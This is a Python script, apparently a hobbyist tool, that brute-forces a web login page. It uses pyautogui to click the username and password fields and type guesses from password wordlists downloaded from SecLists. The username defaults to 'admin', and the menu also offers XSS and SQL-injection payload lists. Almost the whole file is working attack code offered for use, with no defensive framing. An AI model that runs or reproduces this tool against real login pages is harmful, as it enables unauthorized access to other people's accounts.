#imports
import pyautogui
import os
import time
from colorama import Fore
from hashlib import md5
from urllib.request import urlopen, hashlib

#screen clearing function
def screen_clear():
    if os.name == "posix":
        _ = os.system('clear')
    else:
        _ = os.system('cls')



def start():
    #List of wordlist urls
    LocalWordlist = False
    urlwordlist1 = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-100000.txt"
    urlwordlist2 = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
    urlwordlist3 = "https://raw.githubusercontent.com/powerlanguage/word-lists/master/word-list-raw.txt"
    urlwordlist4 = "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/README.md"
    urlwordlist5 = "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/README.md"
    screen_clear()
    #user choice of wordlist
    print("""
                   _           _  __
|_) \/ _    _|_ _ (_|    o ---|_)|_ 
|   / (_||_| |_(_)__||_| |    |_)|  
====================================
By MntlPrblm    """)
    print(Fore.LIGHTRED_EX + "Please select wordlist")
    print(Fore.LIGHTCYAN_EX + "[1] Top 100000 wordlist")
    print(Fore.LIGHTCYAN_EX + "[2] Top million wordlist")
    print(Fore.LIGHTCYAN_EX + "[3] raw-wordlist-txt")
    print(Fore.LIGHTCYAN_EX + "========================")
    print(Fore.LIGHTRED_EX + "Payload wordlists: (messy)")
    print(Fore.LIGHTCYAN_EX + "[4] XSS payload wordlist")
    print(Fore.LIGHTCYAN_EX + "[5] SQLI payload wordlist")
    print(Fore.LIGHTCYAN_EX + "=========================")
    print(Fore.LIGHTCYAN_EX + "[0] wordlist.txt")
    wordlist_option = input(Fore.LIGHTRED_EX + "input: ")
    if wordlist_option == "1":
        WORDLIST = str(urlopen(urlwordlist1).read(), 'utf-8')
    if wordlist_option == "2":
        WORDLIST = str(urlopen(urlwordlist2).read(), 'utf-8')
    if wordlist_option == "3":
        WORDLIST = str(urlopen(urlwordlist3).read(), 'utf-8')
    if wordlist_option == "4":
        WORDLIST = str(urlopen(urlwordlist4).read(), 'utf-8')
    if wordlist_option == "5":
        WORDLIST = str(urlopen(urlwordlist5).read(), 'utf-8')
    if wordlist_option == "9":
        f = open('.\\wordlist.txt', "r", encoding="ISO-8859-1")
        WORDLIST = f.read().splitlines()
        LocalWordlist = True
        f.close()
    screen_clear()
    #Username input
    print(Fore.LIGHTRED_EX + "Please enter username")
    username = input(Fore.LIGHTCYAN_EX + "Press enter for default: ")
    if username == "":
        username = "admin"
    screen_clear()
    #delay input
    delay = input(Fore.LIGHTCYAN_EX + "Amount of delay between login attempts: ")
    screen_clear()
    print(Fore.LIGHTRED_EX + "After you press enter, move your cursor to the username position, and wait 15 seconds")
    input(Fore.LIGHTCYAN_EX + "Press enter when ready: ")
    time.sleep(15)
    #Captures username position
    username_pos = pyautogui.position()
    pyautogui.alert('Username position captured')
    screen_clear()
    print(Fore.LIGHTRED_EX + "After you press enter, move your curson to the password field, and wait for 15 seconds")
    input(Fore.LIGHTCYAN_EX + "Press enter when ready: ")
    time.sleep(15)
    #captures password position
    password_pos = pyautogui.position()
    pyautogui.alert('Password position captured')
    screen_clear()
    print(Fore.LIGHTRED_EX + "Positions captured")
    print(Fore.LIGHTRED_EX + "Username position: "+ Fore.WHITE + str(username_pos))
    print(Fore.LIGHTRED_EX + "Password position: "+ Fore.WHITE + str(password_pos))
    print("")
    print(Fore.LIGHTRED_EX + "Press enter, and move to the login page, the attack will begin 15 seconds after")
    input(Fore.LIGHTCYAN_EX + "Press enter when ready: ")
    screen_clear
    print(Fore.LIGHTRED_EX + "Waiting 15 seconds... move to the login page")
    time.sleep(15)
    #code for attack
    if LocalWordlist == True:
        for guess in WORDLIST:
            pyautogui.click(username_pos)
            pyautogui.typewrite(username)
            pyautogui.typewrite(['tab'])
            pyautogui.click(password_pos)
            print(Fore.LIGHTRED_EX + "Tring password: "+Fore.WHITE + guess)
            pyautogui.typewrite(guess)
            pyautogui.typewrite(['enter'])
            time.sleep(int(delay))
    else:
        for guess in WORDLIST.split('\n'):
            pyautogui.click(username_pos)
            pyautogui.typewrite(username)
            pyautogui.typewrite(['tab'])
            pyautogui.click(password_pos)
            print(Fore.LIGHTRED_EX + "Tring password: "+Fore.WHITE + guess)
            pyautogui.typewrite(guess)
            pyautogui.typewrite(['enter'])
            time.sleep(int(delay))




if __name__ == "__main__":
    start()